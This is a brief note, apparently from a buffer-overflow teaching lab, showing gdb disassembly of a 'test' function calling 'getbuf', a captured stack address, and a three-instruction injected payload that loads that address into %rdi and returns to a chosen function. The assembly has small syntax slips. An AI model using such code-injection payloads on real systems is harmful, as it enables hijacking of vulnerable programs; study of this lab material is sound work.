```shell
0x401968 <test>         sub    $0x8,%rsp                                            
B+> 0x40196c <test+4>       mov    $0x0,%eax                                            
0x401971 <test+9>       callq  0x4017a8 <getbuf>                                    
0x401976 <test+14>      mov    %eax,%edx              
```
=>  p /x $rsp      
0x5561dca8

```asm
movq  $0x5561dca8 %rdi
pushq $4018fa
ret
```

